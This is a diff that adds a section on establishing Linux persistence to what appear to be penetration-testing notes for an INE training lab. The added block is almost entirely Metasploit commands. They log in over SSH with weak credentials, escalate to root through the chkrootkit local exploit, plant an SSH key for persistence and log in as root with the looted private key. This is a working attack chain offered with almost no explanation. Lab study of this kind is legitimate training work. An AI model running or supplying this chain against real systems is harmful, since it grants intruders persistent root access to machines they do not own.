@@ -2659,3 +2659,42 @@ exploit
 ```
 
 > This will exploit the vulnerability by creating a cron job.
+
+
+### Establishing Persistence On Linux
+
+``` msfconsole
+nmap -sS -sV demo.ine.local
+msfconsole
+
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS demo.ine.local
+set USERNAME jackie
+set PASSWORD password
+exploit
+
+sessions -u 1
+
+use exploit/unix/local/chkrootkit
+set SESSION 2
+set CHKROOTKIT /bin/chkrootkit
+
+
+sessions -u 3
+
+use post/linux/manage/sshkey_persistence
+set SESSION 4
+set CREATESSHFOLDER true
+exploit
+
+
+/root/.msf4/loot/20240716164352_default_192.217.38.3_id_rsa_606834.txt
+
+cp /root/.msf4/loot/20240716164352_default_192.217.38.3_id_rsa_606834.txt ssh_key
+
+
+chmod 0400 ssh_key
+
+ssh -i ssh_key root@demo.ine.local
+
+```
